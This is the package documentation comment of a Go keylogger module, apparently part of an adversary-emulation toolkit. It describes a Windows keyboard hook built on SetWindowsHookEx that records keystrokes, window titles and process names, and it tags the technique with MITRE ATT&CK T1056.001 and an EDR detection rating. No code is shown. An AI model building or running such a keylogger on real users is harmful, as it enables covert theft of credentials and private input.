// Package keylog captures keystrokes using a low-level keyboard hook.
//
// Technique: Low-level keyboard hook via SetWindowsHookEx.
// MITRE ATT&CK: T1056.001 (Input Capture: Keylogging)
// Platform: Windows
// Detection: High -- keyboard hooks are monitored by most EDR products;
// SetWindowsHookEx calls trigger behavioral detections.
//
// The hook callback translates virtual key codes to Unicode characters,
// captures the foreground window title and owning process, then sends
// events through a channel. The message loop runs on a locked OS thread
// and is torn down when the context is cancelled.
package keylog
